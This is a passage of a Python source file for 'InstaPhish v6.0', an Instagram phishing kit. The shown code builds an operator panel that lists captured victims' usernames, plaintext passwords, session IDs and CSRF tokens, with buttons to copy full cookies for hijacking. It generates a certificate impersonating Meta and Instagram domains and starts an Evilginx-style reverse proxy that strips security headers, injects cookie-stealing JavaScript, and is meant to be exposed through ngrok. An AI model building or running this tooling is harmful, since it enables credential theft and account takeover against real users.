                        showToast(`🔔 ${data.victims.length - previousCount} new victim(s) captured!`);
                    }
                    previousCount = data.victims.length;
                    
                    let html = '';
                    data.victims.forEach(function(v, index) {
                        const method = v.capture_method || 'proxy';
                        let badgeClass = 'badge-proxy';
                        if (method.includes('cookie')) badgeClass = 'badge-warning';
                        else if (method.includes('login')) badgeClass = 'badge-danger';
                        else if (method.includes('form')) badgeClass = 'badge-success';
                        
                        html += `
                            <tr class="${index === 0 ? 'new-row' : ''}">
                                <td style="white-space:nowrap;font-size:11px;">${v.timestamp || '-'}</td>
                                <td style="font-family:monospace;font-size:12px;">${v.ip_address || v.ip || '-'}</td>
                                <td><strong>${v.username || '-'}</strong></td>
                                <td style="color:var(--warn);">${v.password || '-'}</td>
                                <td class="cookie-cell" title="${v.sessionid || ''}" onclick="copyText('${v.sessionid || ''}')">${v.sessionid ? v.sessionid.substring(0, 25) + '...' : '-'}</td>
                                <td class="cookie-cell" title="${v.csrftoken || ''}" onclick="copyText('${v.csrftoken || ''}')">${v.csrftoken ? v.csrftoken.substring(0, 20) + '...' : '-'}</td>
                                <td><span class="badge ${badgeClass}">${method}</span></td>
                                <td>
                                    <div class="btn-group">
                                        <button class="btn btn-copy btn-sm" onclick="copyVictimCookies(${v.id})">📋 Copy</button>
                                        <button class="btn btn-danger btn-sm" onclick="deleteVictim(${v.id})">🗑</button>
                                    </div>
                                </td>
                            </tr>
                        `;
                    });
                    victimsTable.innerHTML = html;
                }
                
                // Update sessions table
                const sessionsTable = document.getElementById('sessions-table');
                if (!data.sessions || data.sessions.length === 0) {
                    sessionsTable.innerHTML = '<tr><td colspan="6"><div class="empty-state"><div class="empty-state-icon">🔐</div><p>No active sessions yet</p></div></td></tr>';
                } else {
                    let html = '';
                    data.sessions.forEach(function(s) {
                        html += `
                            <tr>
                                <td style="white-space:nowrap;font-size:11px;">${s.captured_at || '-'}</td>
                                <td class="cookie-cell" title="${s.sessionid || ''}" onclick="copyText('${s.sessionid || ''}')">${s.sessionid ? s.sessionid.substring(0, 30) + '...' : '-'}</td>
                                <td class="cookie-cell" title="${s.csrftoken || ''}" onclick="copyText('${s.csrftoken || ''}')">${s.csrftoken ? s.csrftoken.substring(0, 20) + '...' : '-'}</td>
                                <td>${s.ds_user_id || '-'}</td>
                                <td><span class="badge badge-success">Active</span></td>
                                <td>
                                    <button class="btn btn-copy btn-sm" onclick="copySessionData(${s.id})">📋 Copy</button>
                                </td>
                            </tr>
                        `;
                    });
                    sessionsTable.innerHTML = html;
                }
                
            } catch (error) {
                console.error('Error:', error);
            }
        }
        
        function filterTable(query) {
            const rows = document.querySelectorAll('#victims-table tr');
            const lowerQuery = query.toLowerCase();
            rows.forEach(function(row) {
                const text = row.textContent.toLowerCase();
                row.style.display = text.includes(lowerQuery) ? '' : 'none';
            });
        }
        
        function copyText(text) {
            if (!text || text === '-') return;
            navigator.clipboard.writeText(text).then(function() {
                showToast('✅ Copied to clipboard!');
            }).catch(function() {
                const textarea = document.createElement('textarea');
                textarea.value = text;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
                showToast('✅ Copied!');
            });
        }
        
        async function copyVictimCookies(victimId) {
            try {
                const response = await fetch('/api/cookies/' + victimId);
                const data = await response.json();
                if (data.cookies) {
                    copyText(data.cookies);
                    showToast('🍪 Full cookies copied! Use with EditThisCookie extension.');
                } else {
                    showToast('⚠️ No cookies available for this victim');
                }
            } catch (e) {
                showToast('❌ Error fetching cookies');
            }
        }
        
        async function copySessionData(sessionId) {
            try {
                const response = await fetch('/api/session/' + sessionId);
                const data = await response.json();
                if (data.cookies) {
                    copyText(data.cookies);
                    showToast('🍪 Session cookies copied!');
                }
            } catch (e) {
                showToast('❌ Error');
            }
        }
        
        async function deleteVictim(id) {
            if (confirm('Delete this victim record?')) {
                await fetch('/api/delete/' + id);
                refreshData();
                showToast('🗑 Record deleted');
            }
        }
        
        async function clearAllData() {
            if (confirm('⚠️ Delete ALL records? This cannot be undone!')) {
                await fetch('/api/clear-all');
                previousCount = 0;
                refreshData();
                showToast('🗑 All records cleared');
            }
        }
        
        function showToast(message) {
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(function() {
                toast.style.opacity = '0';
                toast.style.transition = 'opacity 0.3s';
                setTimeout(function() { toast.remove(); }, 300);
            }, 3000);
        }
        
        // Auto-refresh every 3 seconds
        refreshData();
        setInterval(refreshData, 3000);
        
        // Auto-backup every 5 minutes
        setInterval(async function() {
            await fetch('/api/backup');
        }, 300000);
    </script>
</body>
</html>'''
        
        with open("admin.html", "w", encoding="utf-8") as f:
            f.write(html)
    
    def start(self):
        """Start the admin panel server"""
        try:
            from flask import Flask, jsonify
        except ImportError:
            print(f"{Color.RED}[!] Flask required: pip install flask{Color.RESET}")
            return
        
        app = Flask(__name__)
        db = DatabaseManager()
        
        @app.route('/')
        def index():
            try:
                with open("admin.html", "r", encoding="utf-8") as f:
                    return f.read()
            except:
                return "<h1>Admin panel not found</h1>", 500
        
        @app.route('/api/data')
        def api_data():
            stats = db.get_stats()
            victims = db.get_victims(limit=200)
            sessions = db.get_active_sessions(limit=100)
            
            return jsonify({
                'stats': stats,
                'victims': victims,
                'sessions': sessions
            })
        
        @app.route('/api/cookies/<int:victim_id>')
        def api_get_cookies(victim_id):
            victims = db.get_victims(limit=1)
            for v in victims:
                if v.get('id') == victim_id:
                    return jsonify({'cookies': v.get('all_cookies', '')})
            return jsonify({'cookies': ''})
        
        @app.route('/api/session/<int:session_id>')
        def api_get_session(session_id):
            sessions = db.get_active_sessions(limit=200)
            for s in sessions:
                if s.get('id') == session_id:
                    return jsonify({'cookies': s.get('all_cookies', '')})
            return jsonify({'cookies': ''})
        
        @app.route('/api/delete/<int:victim_id>')
        def api_delete(victim_id):
            db.delete_victim(victim_id)
            return jsonify({'status': 'deleted'})
        
        @app.route('/api/clear-all')
        def api_clear():
            db.clear_all()
            return jsonify({'status': 'cleared'})
        
        @app.route('/api/backup')
        def api_backup():
            backup_path = db.backup()
            if backup_path:
                return jsonify({'status': 'backed up', 'file': backup_path})
            return jsonify({'status': 'error'})
        
        print(f"{Color.BLUE}[+] Admin panel: http://0.0.0.0:{CONFIG.ADMIN_PORT}{Color.RESET}")
        app.run(host='0.0.0.0', port=CONFIG.ADMIN_PORT, debug=False, use_reloader=False)

# ==================== MAIN APPLICATION ====================
class InstaPhish:
    """Main application controller"""
    
    def __init__(self):
        self.db = DatabaseManager()
        self.admin_panel = AdminPanel()
        self.site_builder = ClonedSiteBuilder()
    
    def setup(self):
        """Initial setup"""
        print(f"\n{Color.CYAN}{'='*60}{Color.RESET}")
        print(f"{Color.CYAN}[*] Initializing InstaPhish v6.0...{Color.RESET}")
        print(f"{Color.CYAN}{'='*60}{Color.RESET}\n")
        
        # Create directories
        dirs = ["certs", "logs", "cloned_site", "cloned_site/css", 
                "cloned_site/js", "cloned_site/images", "sessions", "backups", "lures"]
        for d in dirs:
            Path(d).mkdir(parents=True, exist_ok=True)
        print(f"{Color.GREEN}[+] Directory structure ready{Color.RESET}")
        
        # Generate SSL certificate
        if not os.path.exists(CONFIG.SSL_CERT):
            print(f"{Color.YELLOW}[*] Generating SSL certificate...{Color.RESET}")
            cmd = f'''
            openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes \
                -keyout {CONFIG.SSL_KEY} \
                -out {CONFIG.SSL_CERT} \
                -subj "/C=US/ST=California/L=Menlo Park/O=Meta Platforms Inc./CN=*.instagram.com" \
                -addext "subjectAltName=DNS:*.instagram.com,DNS:*.cdninstagram.com,DNS:*.fbcdn.net,DNS:instagram.com,DNS:www.instagram.com" \
                -addext "basicConstraints=CA:FALSE" \
                -addext "keyUsage=digitalSignature,nonRepudiation,keyEncipherment,dataEncipherment" \
                -addext "extendedKeyUsage=serverAuth,clientAuth" 2>/dev/null
            '''
            os.system(cmd)
            if os.path.exists(CONFIG.SSL_CERT):
                print(f"{Color.GREEN}[+] SSL certificate generated{Color.RESET}")
        else:
            print(f"{Color.GREEN}[+] SSL certificate found{Color.RESET}")
        
        # Build cloned site
        self.site_builder.build()
        
        # Check images
        required_images = ['facebook.png', 'google-play.png', 'insta_logo.png', 
                          'microsoft.png', 'phones.png', 'ss1.png', 'ss2.png', 
                          'ss3.png', 'title.jpg']
        missing = []
        for img in required_images:
            if not os.path.exists(f"cloned_site/images/{img}"):
                if os.path.exists(f"images/{img}"):
                    shutil.copy2(f"images/{img}", f"cloned_site/images/{img}")
                else:
                    missing.append(img)
        
        if missing:
            print(f"\n{Color.YELLOW}{'='*60}{Color.RESET}")
            print(f"{Color.YELLOW}[!] Missing {len(missing)} image(s):{Color.RESET}")
            for img in missing:
                print(f"{Color.YELLOW}    - {img}{Color.RESET}")
            print(f"{Color.YELLOW}[!] Download from: https://github.com/r4tur1/InstaPhish/tree/main/images{Color.RESET}")
            print(f"{Color.YELLOW}[!] Copy to: cloned_site/images/{Color.RESET}")
            print(f"{Color.YELLOW}{'='*60}{Color.RESET}\n")
        else:
            print(f"{Color.GREEN}[+] All 9 required images found{Color.RESET}")
        
        print(f"\n{Color.CYAN}{'='*60}{Color.RESET}")
        print(f"{Color.GREEN}[+] Setup complete!{Color.RESET}")
        print(f"{Color.CYAN}{'='*60}{Color.RESET}\n")
    
    def start(self):
        """Start the phishing server"""
        # Start admin panel in background
        admin_thread = threading.Thread(target=self.admin_panel.start, daemon=True)
        admin_thread.start()
        time.sleep(1.5)
        
        # Start reverse proxy server
        server = socketserver.ThreadingTCPServer(
            (CONFIG.LISTEN_HOST, CONFIG.LISTEN_PORT),
            ReverseProxyHandler
        )
        
        # Enable SSL
        if os.path.exists(CONFIG.SSL_CERT) and os.path.exists(CONFIG.SSL_KEY):
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(CONFIG.SSL_CERT, CONFIG.SSL_KEY)
                ctx.minimum_version = ssl.TLSVersion.TLSv1_2
                ctx.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
                server.socket = ctx.wrap_socket(server.socket, server_side=True)
                print(f"{Color.GREEN}[+] HTTPS Reverse Proxy on port {CONFIG.LISTEN_PORT}{Color.RESET}")
            except Exception as e:
                print(f"{Color.RED}[!] SSL failed: {e}{Color.RESET}")
                print(f"{Color.YELLOW}[*] Running in HTTP mode{Color.RESET}")
        
        print(f"""
{Color.CYAN}╔══════════════════════════════════════════════════════════════╗
{Color.CYAN}║                                                              ║
{Color.CYAN}║  {Color.WHITE}Phishing URL:{Color.RESET}  {Color.GREEN}https://127.0.0.1:{CONFIG.LISTEN_PORT}{Color.RESET}                        {Color.CYAN}║
{Color.CYAN}║  {Color.WHITE}Admin Panel:{Color.RESET}   {Color.GREEN}http://127.0.0.1:{CONFIG.ADMIN_PORT}{Color.RESET}                         {Color.CYAN}║
{Color.CYAN}║  {Color.WHITE}Credentials:{Color.RESET}  logs/credentials.txt                       {Color.CYAN}║
{Color.CYAN}║  {Color.WHITE}Cookies:{Color.RESET}      logs/cookies.txt                           {Color.CYAN}║
{Color.CYAN}║                                                              ║
{Color.CYAN}║  {Color.YELLOW}Expose: ngrok http {CONFIG.LISTEN_PORT}{Color.RESET}                                 {Color.CYAN}║
{Color.CYAN}║                                                              ║
{Color.CYAN}╚══════════════════════════════════════════════════════════════╝
{Color.GREEN}[✓] Evilginx2-Style Reverse Proxy Active{Color.RESET}
{Color.GREEN}[✓] 8-Layer Cookie Interception:{Color.RESET}
{Color.WHITE}    1. Set-Cookie Header Interception (Proxy Level)
    2. document.cookie Hook
    3. XMLHttpRequest Interception
    4. Fetch API Interception
    5. Form Submission Capture
    6. Login Click Capture
    7. Periodic Beacon (4s)
    8. Initial Cookie Dump{Color.RESET}
{Color.GREEN}[✓] Security Headers Stripped{Color.RESET}
{Color.GREEN}[✓] Cookie Capture JavaScript Injected{Color.RESET}
{Color.GREEN}[✓] Real-Time Admin Panel on port {CONFIG.ADMIN_PORT}{Color.RESET}
{Color.RED}[!] Press Ctrl+C to stop{Color.RESET}
""")
        
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print(f"\n{Color.YELLOW}[*] Shutting down...{Color.RESET}")
            server.shutdown()
            self.db.backup()
            print(f"{Color.GREEN}[+] Server stopped. Data saved.{Color.RESET}")
            print(f"{Color.GREEN}[+] Backup created in backups/{Color.RESET}")
            sys.exit(0)

def main():
    """Entry point"""
    Banner.print_startup_banner()
    
    app = InstaPhish()
    app.setup()
    app.start()

if __name__ == "__main__":
    main()
